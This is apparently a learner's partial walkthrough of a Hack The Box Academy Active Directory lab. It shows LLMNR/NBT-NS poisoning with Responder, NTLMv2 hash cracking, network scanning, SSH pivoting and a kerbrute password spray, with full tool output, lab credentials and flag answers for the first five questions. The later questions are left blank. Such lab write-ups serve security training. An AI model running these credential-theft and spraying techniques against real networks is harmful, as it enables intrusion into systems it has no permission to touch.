# AD Enumeration & Attacks - Skills Assessment Part II
## Scenario
Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

## Questions
SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name? **Answer: AB920**
   - Setup responder and wait for LLMNR, NBT-NS, and MDNS broadcast requests → read the NTLMv2-SSP Username:
     ```
     $ sudo responder -I ens224 -wrfv
     [+] Listening for events...

     [*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
     [!]  Fingerprint failed
     [*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
     [*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
     [!]  Fingerprint failed
     [*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
     [SMB] NTLMv2-SSP Client   : 172.16.7.3
     [SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
     [SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:50bf479bb8f547ec:7542EFDB571548C87F59DA00C3922C96:01010000000000008039478881D0DC01B73975703B2B7B5B0000000002000800390049005900520001001E00570049004E002D0049004500490037005A0033003000530053005600560004003400570049004E002D0049004500490037005A003300300053005300560056002E0039004900590052002E004C004F00430041004C000300140039004900590052002E004C004F00430041004C000500140039004900590052002E004C004F00430041004C00070008008039478881D0DC0106000400020000000800300030000000000000000000000000200000FDD98079412048A24FF4CB3D5B641627B9639572946BABBF2E1ABAEB498D0CCC0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
     ```
2. What is this user's cleartext password? **Answer: weasal**
   - Copy the hash and crack it offline:
     ```sh
     $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
     <SNIP>
     AB920::INLANEFREIGHT:50bf479bb8f547ec:7542efdb571548c87f59da00c3922c96:01010000000000008039478881d0dc01b73975703b2b7b5b0000000002000800390049005900520001001e00570049004e002d0049004500490037005a0033003000530053005600560004003400570049004e002d0049004500490037005a003300300053005300560056002e0039004900590052002e004c004f00430041004c000300140039004900590052002e004c004f00430041004c000500140039004900590052002e004c004f00430041004c00070008008039478881d0dc0106000400020000000800300030000000000000000000000000200000fdd98079412048a24ff4cb3d5b641627b9639572946babbf2e1abaeb498d0ccc0a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
     <SNIP>
     ```
3. Submit the contents of the C:\flag.txt file on MS01. **Answer: aud1t_gr0up_m3mbersh1ps!**
   - Enumerating the AD network:
     ```sh
     $fping -asgq 172.16.7.0/23
     172.16.7.3
     172.16.7.50
     172.16.7.60
     172.16.7.240

          510 targets
          4 alive
          506 unreachable
          0 unknown addresses

     2024 timeouts (waiting for response)
     2028 ICMP Echos sent
          4 ICMP Echo Replies received
     2024 other ICMP received

     0.084 ms (min round trip time)
     1.54 ms (avg round trip time)
     2.90 ms (max round trip time)
          14.302 sec (elapsed real time)
     ```
   - Copy those IP addresses to `hosts` and perform nmap scan to identify each host → MS01 is at `172.16.7.50`:
     ```sh
     $nmap -A -iL hosts -oN host-enum
     Starting Nmap 7.92 ( https://nmap.org ) at 2026-04-20 05:45 EDT
     Nmap scan report for inlanefreight.local (172.16.7.3)
     Host is up (0.066s latency).
     Not shown: 989 closed tcp ports (conn-refused)
     PORT     STATE SERVICE       VERSION
     53/tcp   open  domain        Simple DNS Plus
     88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-20 09:45:04Z)
     135/tcp  open  msrpc         Microsoft Windows RPC
     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
     389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
     445/tcp  open  microsoft-ds?
     464/tcp  open  kpasswd5?
     593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
     636/tcp  open  tcpwrapped
     3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
     3269/tcp open  tcpwrapped
     Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

     Host script results:
     |_clock-skew: -1m05s
     | smb2-time: 
     |   date: 2026-04-20T09:45:10
     |_  start_date: N/A
     | smb2-security-mode: 
     |   3.1.1: 
     |_    Message signing enabled and required
     |_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:72:d1 (VMware)

     Nmap scan report for 172.16.7.50
     Host is up (0.070s latency).
     Not shown: 996 closed tcp ports (conn-refused)
     PORT     STATE SERVICE       VERSION
     135/tcp  open  msrpc         Microsoft Windows RPC
     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
     445/tcp  open  microsoft-ds?
     3389/tcp open  ms-wbt-server Microsoft Terminal Services
     |_ssl-date: 2026-04-20T09:45:49+00:00; -33s from scanner time.
     | ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
     | Not valid before: 2026-04-19T09:29:17
     |_Not valid after:  2026-10-19T09:29:17
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

     Host script results:
     |_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:94:08 (VMware)
     | smb2-security-mode: 
     |   3.1.1: 
     |_    Message signing enabled but not required
     |_clock-skew: mean: -33s, deviation: 0s, median: -34s
     | smb2-time: 
     |   date: 2026-04-20T09:45:41
     |_  start_date: N/A

     Nmap scan report for 172.16.7.60
     Host is up (0.070s latency).
     Not shown: 996 closed tcp ports (conn-refused)
     PORT     STATE SERVICE       VERSION
     135/tcp  open  msrpc         Microsoft Windows RPC
     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
     445/tcp  open  microsoft-ds?
     1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
     | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
     | Not valid before: 2026-04-20T09:31:57
     |_Not valid after:  2056-04-20T09:31:57
     |_ssl-date: 2026-04-20T09:45:18+00:00; -1m05s from scanner time.
     | ms-sql-ntlm-info: 
     |   Target_Name: INLANEFREIGHT
     |   NetBIOS_Domain_Name: INLANEFREIGHT
     |   NetBIOS_Computer_Name: SQL01
     |   DNS_Domain_Name: INLANEFREIGHT.LOCAL
     |   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
     |   DNS_Tree_Name: INLANEFREIGHT.LOCAL
     |_  Product_Version: 10.0.17763
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

     Host script results:
     |_clock-skew: mean: -1m05s, deviation: 0s, median: -1m05s
     |_nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:df:be (VMware)
     | ms-sql-info: 
     |   Windows server name: SQL01
     |   172.16.7.60\SQLEXPRESS: 
     |     Instance name: SQLEXPRESS
     |     Version: 
     |       name: Microsoft SQL Server 2019 RTM
     |       number: 15.00.2000.00
     |       Product: Microsoft SQL Server 2019
     |       Service pack level: RTM
     |       Post-SP patches applied: false
     |     TCP port: 1433
     |_    Clustered: false
     | smb2-security-mode: 
     |   3.1.1: 
     |_    Message signing enabled but not required
     | smb2-time: 
     |   date: 2026-04-20T09:45:10
     |_  start_date: N/A

     Nmap scan report for 172.16.7.240
     Host is up (0.069s latency).
     Not shown: 998 closed tcp ports (conn-refused)
     PORT     STATE SERVICE       VERSION
     22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
     | ssh-hostkey: 
     |   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)
     |   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)
     |_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)
     3389/tcp open  ms-wbt-server xrdp
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

     Post-scan script results:
     | clock-skew: 
     |   -1m05s: 
     |     172.16.7.60
     |_    172.16.7.3 (inlanefreight.local)
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 4 IP addresses (4 hosts up) scanned in 37.65 seconds
     ```
   - Enable dynamic port forwarding with ssh and RDP to the target to read the flag:
     ```sh
     $ ssh htb-student@10.129.70.129 -D 9050
     $ proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal
     ```
4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. **Answer: BR086**
   - Enumerate domain users and create a list of them for later password spraying attack:
     ```sh
     $sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee  usernames.txt
     $cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
     ```
   - Perform password spraying with password `Welcome1`:
     ```sh
     $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1

     __             __               __     
     / /_____  _____/ /_  _______  __/ /____ 
     / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
     / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
     /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

     Version: dev (9cfb81e) - 04/20/26 - Ronnie Flathers @ropnop

     2026/04/20 06:58:45 >  Using KDC(s):
     2026/04/20 06:58:45 >  	172.16.7.3:88

     2026/04/20 06:59:02 >  [+] VALID LOGIN:	 BR086@inlanefreight.local:Welcome1
     2026/04/20 06:59:02 >  Done! Tested 2904 logins (1 successes) in 17.010 seconds
     ```
5. What is this user's password? **Answer: Welcome1**
   - Above password spraying attack
6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? **Answer:**
   - 
7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. **Answer:**
8. Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host. **Answer:**
9.  Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name? **Answer:**
10. Crack this user's password hash and submit the cleartext password as your answer. **Answer:**
11. Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. **Answer:**
12. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. **Answer:**